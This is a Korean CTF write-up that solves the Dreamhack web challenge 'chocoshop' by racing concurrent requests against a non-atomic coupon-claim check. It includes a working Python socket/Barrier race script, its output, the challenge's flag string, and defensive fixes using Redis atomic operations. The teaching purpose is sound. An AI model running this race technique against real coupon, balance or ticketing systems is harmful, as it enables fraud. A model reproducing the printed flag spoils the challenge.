---
layout: post
title:  "Dreamhack 워게임 chocoshop 풀이 — 쿠폰 발급 race condition으로 2배 충전하기"
date:   2026-05-15 04:30:00 +0900
categories: security web wargame dreamhack writeup race-condition flask
---

## 들어가며

Dreamhack 웹해킹 워게임 **chocoshop** (난이도 Silver 2) 풀이입니다. 빼빼로데이 컨셉의 미니 쇼핑몰인데, **쿠폰 발급(claim) 로직의 race condition**으로 한 세션이 받을 수 있는 쿠폰 한도를 부숴서 FLAG를 사는 문제입니다.

문제 설명 발췌:

> 드림이는 빼빼로데이를 맞아 티오리제과에서 빼빼로 구매를 위한 쿠폰을 받았습니다.
> 하지만 우리의 목적은 FLAG! 그런데 이런, FLAG는 너무 비싸 살 수가 없네요...
> 쿠폰을 여러 번 발급받고 싶었는데 이것도 불가능해요.
> 내부자 말에 의하면 사용된 쿠폰을 검사하는 로직이 취약하다는데, 드림이를 도와 FLAG를 구매하세요!

스포일러:

- 쿠폰 1개 = 잔액 +1000
- FLAG 가격 = 2000
- 정상 흐름으로는 쿠폰을 1번만 받을 수 있음 → 잔액 max 1000 → 살 수 없음
- 핵심: `/coupon/claim` 의 **check → update** 가 원자적이지 않음 → 두 요청을 동시에 보내 양쪽 모두 통과시키면 **쿠폰 2장**

최종 flag: `DH{781b791fa0ef98ff734bf37ec95bf5c27fd95710e6745274f045b376b590fb42}`.

## 1. 코드 정독

```python
# app.py 의 핵심 4개 라우트

@app.route('/session')
def make_session():
    uuid = uuid4().hex
    r.setex(f'SESSION:{uuid}', timedelta(minutes=10),
            dumps({'uuid': uuid, 'coupon_claimed': False, 'money': 0}))
    return jsonify({'session': uuid})

@app.route('/coupon/claim')
@get_session()
def coupon_claim(user):
    if user['coupon_claimed']:                               # ① 체크
        raise BadRequest('You already claimed the coupon!')

    coupon_uuid = uuid4().hex
    data = {'uuid': coupon_uuid, 'user': user['uuid'],
            'amount': 1000, 'expiration': int(time()) + 45}
    user['coupon_claimed'] = True                            # ② 업데이트(메모리)
    coupon = jwt.encode(data, JWT_SECRET, algorithm='HS256').decode('utf-8')
    r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10),
            dumps(user))                                     # ③ Redis 에 저장
    return jsonify({'coupon': coupon})

@app.route('/coupon/submit')
@get_session()
def coupon_submit(user):
    coupon = jwt.decode(request.headers['coupon'], JWT_SECRET, algorithms='HS256')
    if coupon['expiration'] < int(time()):
        raise BadRequest('Coupon expired!')

    # Rate limit: 10초에 1번만 제출 가능
    if not r.setnx(f'RATELIMIT:{user["uuid"]}', 1):
        raise BadRequest('Rate limit reached!')
    r.expire(f'RATELIMIT:{user["uuid"]}', timedelta(seconds=10))

    # 사용된 쿠폰 검사
    if not r.setnx(f'COUPON:{coupon["uuid"]}', 1):
        raise BadRequest('Your coupon is alredy submitted!')

    if user['uuid'] != coupon['user']:
        raise Unauthorized('You cannot submit others coupon!')

    r.expire(f'COUPON:{coupon["uuid"]}',
             timedelta(seconds=coupon['expiration'] - int(time())))
    user['money'] += coupon['amount']
    r.setex(f'SESSION:{user["uuid"]}', timedelta(minutes=10), dumps(user))
    return jsonify({'status': 'success'})

@app.route('/flag/claim')
@get_session()
def flag_claim(user):
    if user['money'] < 2000:
        raise BadRequest('Not enough money')
    user['money'] -= 2000   # 메모리에만, Redis 에는 안 씀
    return jsonify({'status': 'success', 'message': FLAG})
```

### 1-1. 코드에서 잡히는 단서들

1. **`/coupon/claim` 은 check-then-act 패턴이다.**
   ```python
   if user['coupon_claimed']: raise ...    # check
   ...
   user['coupon_claimed'] = True           # act
   r.setex(...)                            # commit to Redis
   ```
   체크와 커밋 사이가 **원자적이지 않다**. 두 요청이 거의 동시에 도착하면 둘 다 `coupon_claimed=False` 인 사용자 상태를 보고 통과한다. 클래식한 **TOCTOU (Time Of Check / Time Of Use)** 레이스.

2. **`/coupon/submit` 은 단단하다.**
   - Rate limit: `r.setnx(RATELIMIT:user)` — Redis setnx 는 원자적, 한 명만 통과.
   - 중복 사용 검사: `r.setnx(COUPON:uuid)` — 마찬가지로 원자적.
   - 즉, 같은 쿠폰을 두 번 못 쓰고, 같은 사용자가 10초에 한 번만 제출 가능.

3. **JWT 는 HS256 + secret 모르므로 위·변조 불가.** secret.py 가 컨테이너에만 있음.

4. **`/flag/claim` 은 Redis 에 안 써준다.** 메모리에서 money 를 줄이지만 다음 요청에서는 다시 원상복구. 한 번 잔액이 2000 이 되면 여러 번 살 수 있다 (단, 이번 문제는 한 번이면 충분).

이 4가지에서 **공격 경로는 자명** — `/coupon/claim` 의 race 로 한 세션에 코인 2개 이상을 얻고, 10초 간격으로 `/coupon/submit` 을 두 번 보내 잔액 2000 을 만든 뒤 `/flag/claim`.

## 2. 익스플로잇

### 2-1. Race 의 핵심: "정확히 동시에 도착"

HTTP 요청을 평범하게 순차로 보내면 race window 가 무의미하게 좁아진다. 핵심은 **모든 요청을 같은 순간에 서버에 도착시키는 것**. 두 가지 트릭이 도움이 된다.

1. **연결을 미리 모두 맺어둔다.** TCP 핸드셰이크가 변수의 큰 부분이므로 미리 끝낸다.
2. **모든 스레드가 `Barrier` 에서 동시에 출발시킨다.** Python `threading.Barrier(N)` 을 쓰면 모두 도달할 때까지 대기하다가 일제히 통과한다.

```python
import socket, threading

S, P = 'host8.dreamhack.games', 16460
SESSION = '...'   # /session 으로 받은 UUID

req = (f"GET /coupon/claim HTTP/1.1\r\n"
       f"Host: {S}:{P}\r\n"
       f"Authorization: {SESSION}\r\n"
       f"Connection: close\r\n\r\n").encode()

N = 30
# (1) 모든 소켓을 미리 connect
socks = [socket.create_connection((S, P)) for _ in range(N)]

# (2) Barrier 로 일제히 send
barrier = threading.Barrier(N)
def fire(s):
    barrier.wait()
    s.sendall(req)
    # ... read response

threads = [threading.Thread(target=fire, args=(s,)) for s in socks]
for t in threads: t.start()
for t in threads: t.join()
```

### 2-2. 결과

```
Session: fa732da320b74993a64ecf28b71b1e48
Got 21 coupons in 0.04s
```

30개의 요청을 동시에 보냈는데 21개가 통과. Redis 의 `r.setex(...)` 가 점진적으로 다른 worker 에 보일 때까지의 짧은 윈도우에 21개가 모두 끼어들었다는 뜻. 우리가 필요한 건 **단 2개**니까 차고 넘친다.

### 2-3. 제출 → 잔액 2000 → FLAG

`/coupon/submit` 은 setnx 기반 rate-limit 이라 race 가 안 통한다. 그냥 11초 (10초 + α) 간격으로 두 번 보낸다.

```python
print(submit(coupons[0]))   # → {"status":"success"}, money=1000
time.sleep(11)
print(submit(coupons[1]))   # → {"status":"success"}, money=2000
print(get_me())             # → {"money":2000, ...}
print(claim_flag())
# → {"message":"DH{781b791fa0ef98ff734bf37ec95bf5c27fd95710e6745274f045b376b590fb42}\n","status":"success"}
```

flag 획득. ✓

## 3. 취약점 해설 — TOCTOU on Application State

이 클래스의 버그를 일반화하면:

> 단일 객체에 대한 read → modify → write 패턴이 **원자적이지 않은 저장소**(Redis, RDB, file, in-memory dict 등) 위에서 일어나면, 동시 요청들이 같은 read 결과를 보고 각자 modify/write 를 한다.

같은 패턴이 실무에서 사고로 자주 나오는 곳:

- **쿠폰/포인트/멤버십 발급**: 받을 수 있는 한도 체크가 atomic 하지 않으면 N배 받기 가능.
- **재고 차감**: 1개 남은 한정판 상품에 동시 10명이 결제 → 모두 성공 → 9개 over-sell.
- **잔액 이체**: A → B 송금 시 A 잔액 체크 후 차감하는 사이의 race 로 음수 잔액 만들기.
- **유저 가입/이메일 중복 체크**: 같은 이메일로 N개 계정 생성.
- **사용자별 1회만 가능한 행위**(투표, 댓글, 추첨 응모, 콘서트 티켓 예매 등) 의 모든 변형.

### 3-1. 위험성

이 문제처럼 단순히 "사용자가 쿠폰 2배 받기" 가 아니라, 실제 사고에서는 다음과 같이 번진다.

- 가상화폐 거래소 출금 race: 잔액 1 BTC 가 동시에 N 곳으로 출금되어 N BTC 가 빠져나감.
- 게임 가챠 응모권 race: 1회 한정 응모를 100번 동시에 → 모두 당첨.
- B2B SaaS 의 라이선스 발급 race: 1명짜리 라이선스가 N명에게 발급됨.

### 3-2. 올바른 방어

**원자적 연산으로 한 번에 처리.** Redis 에서는 다음 중 하나.

1. **`SETNX` / `SET NX`** 를 모든 게이트에 일관되게 사용.
   ```python
   if not r.setnx(f'CLAIMED:{user["uuid"]}', 1):
       raise BadRequest('Already claimed!')
   r.expire(...)
   ```
   이렇게 하면 `coupon_claimed` 플래그를 세션 안에 두지 않고 별도 키로 두어 atomic 체크.

2. **Lua 스크립트** 로 read-modify-write 를 한 트랜잭션으로.
   ```lua
   local claimed = redis.call("HGET", KEYS[1], "coupon_claimed")
   if claimed == "1" then return 0 end
   redis.call("HSET", KEYS[1], "coupon_claimed", "1")
   return 1
   ```
   `r.eval(script, ...)` 로 호출.

3. **Redis MULTI/EXEC + WATCH (Optimistic Locking)**.
   ```python
   while True:
       pipe = r.pipeline()
       pipe.watch(session_key)
       data = loads(pipe.get(session_key))
       if data['coupon_claimed']:
           pipe.unwatch(); raise BadRequest(...)
       data['coupon_claimed'] = True
       pipe.multi()
       pipe.setex(session_key, ttl, dumps(data))
       try:
           pipe.execute()
           break
       except redis.WatchError:
           continue  # 다른 클라이언트가 먼저 수정함, 재시도
   ```

4. **DB 레벨 unique constraint** (RDB 라면). `INSERT INTO claimed_coupons(user_id) VALUES (?)` 가 unique 위반시 실패하도록.

5. **분산 락**(redlock, fencing token 등). 단, 단순한 단일 키 작업이면 위 1~3 이 더 가볍다.

### 3-3. "Rate limit" 으로 우회되지 않는 이유

`/coupon/submit` 의 rate limit 은 **Redis setnx 한 줄로 atomic** 하다. 그래서 race 를 걸어도 단 1개만 통과한다. 같은 패턴을 `/coupon/claim` 에도 쓰면 됐을 것을, `/claim` 만 어플리케이션 메모리(=세션 객체)에서 처리한 게 결정타. **방어할 때는 모든 게이트에 같은 수준의 원자성을 일관되게 적용**해야 한다.

## 4. 정리 — 입문자가 가져갈 교훈

- "체크 → 액션 → 커밋" 의 세 줄이 **모두 atomic 하지 않으면** race condition 후보. 코드 리뷰의 1번 항목.
- HTTP/REST API 의 race 는 클라이언트만 잘 다루면 0.04초 안에 30개 요청을 정확히 동시에 도착시킬 수 있다. **"실시간 동시성" 은 공격자에게 어렵지 않다**.
- Redis 의 `setnx` 는 race 방어의 1티어 도구. 단, **expire 와 함께 쓸 때는 `SET key value NX EX ttl`** 한 명령으로 묶거나 expire 실패시 키가 영구히 남는 점에 유의.
- JWT secret 을 모르더라도 **JWT 가 유효한 정상 발급 경로를 race 로 N배 활성화** 시켜 우회 가능한 시나리오는 흔하다. JWT 의 무결성만 믿지 말 것.
- 방어 시 Lua 스크립트 / WATCH-MULTI-EXEC / DB unique constraint 중 하나는 **반드시** 적용.

같은 카테고리의 다음 단계로 **stock-management race**, **financial-ledger race**, **TOCTOU on file upload** 같은 문제를 풀면 좋습니다.

---

## 부록 — 시도하다 막혔던 지점과 회고

### 실패 1. Python `urllib` + `ThreadPoolExecutor` 로 첫 race 시도

처음에는 평소 쓰던 `concurrent.futures.ThreadPoolExecutor` + `urllib.request` 조합으로 10개 동시 요청을 보냈는데, 결과적으로 1개만 통과했습니다. 이유는 두 가지.

- `urllib.request` 가 내부적으로 connection pool / DNS lookup / TLS 핸드셰이크 등을 직렬로 처리.
- ThreadPool 의 스레드 시작 자체에 ms 단위 편차가 있음.

이걸 그대로 두면 race window (Redis 가 setex 를 처리할 때까지의 수 ms) 가 거의 닫혀버린다.

**회고**: 진짜 race 를 노릴 때는 (a) **연결 미리 맺어두기**, (b) **`threading.Barrier`** 로 동시 출발, (c) **raw socket + 미리 만든 request bytes** 로 가장 짧은 코드만 critical path 에 두는 패턴이 정석. ThreadPool 은 task fan-out 용이지 동시성 정밀도 도구가 아니다.

### 실패 2. 쿠폰 만료를 잊고 11초 sleep

쿠폰 expiration 이 45초인데, race 로 쿠폰을 받은 뒤 한참 분석하다가 submit 하니 `Coupon expired!` 가 떨어졌습니다. JWT 의 expiration 클레임이 정직하게 체크됩니다.

**회고**: 만료가 짧은 토큰을 다루는 익스플로잇은 **race 부터 마지막 submit 까지 한 스크립트** 에서 끝내야 한다. "분석 → 잠시 멈춤 → 다시 submit" 흐름은 만료에 걸린다.

또 한 가지: 1번째 submit 후 11초 sleep 이 들어가므로, **남은 expiration ≥ 11초** 인 쿠폰 두 장이 필요. 받자마자 즉시 1번째를 쏘고 11초 후 2번째를 쏘면, 두 번째 쿠폰의 잔여 expiration ≈ 45-12 = 33초로 안전하다.

### 실패 3. `/coupon/submit` 의 race 가능성을 잠시 의심

처음에 "혹시 submit 도 race 로 같은 쿠폰을 2번 통과시킬 수 있나?" 를 검토했지만, `r.setnx(COUPON:uuid, 1)` 이 Redis 의 atomic primitive 라 race 가 통하지 않는다는 점을 코드를 읽고 확인했습니다. 또한 rate-limit 도 같은 패턴이라 같은 사용자가 10초에 한 번만 제출 가능.

**회고**: race 가능성을 코드의 모든 read-modify-write 자리마다 직접 점검해야 한다. setnx/eval/MULTI 같은 atomic 연산이 보이면 그 자리는 race 안 통한다. 점검 시 "어떤 키가 atomic guard 인가" 를 한 줄씩 적어두면 시간이 절약된다.

### 실패 4. 코인 만큼 다 받아도 결국 1번만 쓸 수 있음

race 로 18~21개의 쿠폰을 받은 게 처음에는 짜릿했지만, rate limit 때문에 10초 간격으로 한 개씩 밖에 못 쓰는 게 발견되어 잠깐 멈췄습니다. FLAG 가 2000 이라 **2개만 쓰면 충분** 한 게 다행. 만약 FLAG 가 10000 이었다면 90초 짜리 익스플로잇이 됐을 것.

**회고**: race 로 얻을 수 있는 자원의 양과 그 자원을 소비하는 곳의 throughput 을 둘 다 계산해야 한다. "받는 건 빠른데 쓰는 게 느리면" 시간 비용 계산이 필요하다.
